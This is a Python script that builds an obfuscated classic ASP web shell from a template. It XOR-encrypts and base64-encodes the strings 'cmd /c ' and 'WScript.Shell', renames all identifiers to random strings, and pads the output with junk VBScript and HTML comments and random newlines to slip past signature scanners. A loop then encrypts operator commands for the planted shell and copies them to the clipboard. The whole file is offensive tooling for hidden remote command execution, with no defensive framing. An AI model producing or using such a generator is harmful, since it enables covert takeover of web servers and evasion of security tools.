import random
import string
import base64
import pyperclip
from jinja2 import Environment, FileSystemLoader

def random_string():
    length = random.randint(5, 100)  # Generate a random length between 5 and 100
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def xor_encrypt(data, key):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

def encode_base64(data):
    return base64.b64encode(data.encode()).decode()

def render_template(template_name, **kwargs):
    env = Environment(loader=FileSystemLoader('./'))
    template = env.get_template(template_name)
    return template.render(**kwargs)

def add_random_newlines(template, max_newlines=5):
    """
    Adds random newlines to a given template string at the end of lines to avoid breaking the code.
    
    :param template: str - The original multiline template string.
    :param max_newlines: int - The maximum number of newlines to add.
    :return: str - The mutated template string with newlines added.
    """
    # Split the template into lines
    lines = template.splitlines()
    
    # Select random line indices to add newlines after them
    newline_positions = sorted(random.sample(range(len(lines)), min(max_newlines, len(lines))))

    # Add extra newlines to the selected lines
    for index in newline_positions:
        lines[index] += '\n' * random.randint(1, 50)  # Add between 1 and 50 newlines
    
    # Reassemble the template with the added newlines
    return '\n'.join(lines)

def generate_comments(spaces_count, html_format=False):
    """
    Generates random comment lines with a specified number of spaces prefixed,
    each containing a random number of random strings. The format of the comments
    can be either HTML or VBScript based on the html_format flag.
    
    :param spaces_count: int - Number of spaces to prepend to each comment line.
    :param html_format: bool - If True, returns HTML formatted comments, else VBScript comments.
    :return: str - A string of one or more randomly generated comment lines.
    """
    # Random number of comment lines to generate
    number_of_comments = random.randint(1, 50)
    
    # Generate the comment block
    comment_block = ""
    space_prefix = ' ' * spaces_count
    
    for _ in range(number_of_comments):
        # Random number of strings to generate per comment line
        number_of_strings = random.randint(1, 20) 
        
        # Collect multiple random strings
        comment_strings = ' '.join(random_string() for _ in range(number_of_strings))
        
        if html_format:
            comment_block += f"{space_prefix}<!-- {comment_strings} -->\n"
        else:
            comment_block += f"{space_prefix}' {comment_strings}\n"
    
    return comment_block.strip()

def obfuscate_code(key):
    # Find and replace all template variables
    to_replace = {
        'encryptedInput': random_string(),
        'encryptedCommand': random_string(),
        'decryptedCommand': random_string(),
        'objShell': random_string(),
        'objExecObject': random_string(),
        'strOutput': random_string(),
        'keyString': random_string(),
        'tempDecodedString': random_string(),
        'encryption_key': key,
        'cmd_Decrypted': random_string(),
        'WScript_Shell_Decrypted': random_string(),
        'Base64Encode': random_string(),
        'strText': random_string(),
        'objXML': random_string(),
        'objNode': random_string(),
        'StringToBinary': random_string(),
        'MultiByteToBinary': random_string(),
        'arrData': random_string(),
        'stream': random_string(),
        'Base64Decode': random_string(),
        'BinaryToString': random_string(),
        'binaryVal': random_string(),
        'objStream': random_string(),
        'XORStrings': random_string(),
        'input1': random_string(),
        'input2': random_string(),
        'char1': random_string(),
        'char2': random_string(),
        'xorValue': random_string(),
        'result': random_string(),
        'iterator': random_string(),
        'base64DecodedCommand': random_string(),
        'cmd': encode_base64(xor_encrypt("cmd /c ", key)),
        'WScript_Shell': encode_base64(xor_encrypt("WScript.Shell", key)),
        'Execute_Command': random_string(),
        'Execute_Encrypted_Command': random_string(),
        'Enter_Encrypted_Command': random_string(),
        'inputSize': random.randint(5, 250),
        'SubmitValue': random_string(),
        'vbComment': generate_comments(0),
        'vbComment4': generate_comments(4),
        'vbComment8': generate_comments(8),
        'vbComment12': generate_comments(12),
        'htmlComment': generate_comments(0, html_format=True),
        'htmlComment4': generate_comments(4, html_format=True),
        'htmlComment8': generate_comments(8, html_format=True),
    }

    # Load the template and render it with the variables
    obfuscated_code = render_template('shell.py.j2', **to_replace)

    # Add random newlines to the obfuscated code
    return add_random_newlines(obfuscated_code, 100)

def main():
    key = random_string()    
    obfuscated_code = obfuscate_code(key)
        
    with open("output.asp", "w") as output_file:
        output_file.write(obfuscated_code)

    while True:
        command = input("Enter command to encrypt: ")
        encrypted_command = encode_base64(xor_encrypt(command, key))
        print(f"Encrypted: {encrypted_command}")
        pyperclip.copy(encrypted_command)
        print("Encrypted command copied to clipboard.")

if __name__ == "__main__":
    main()
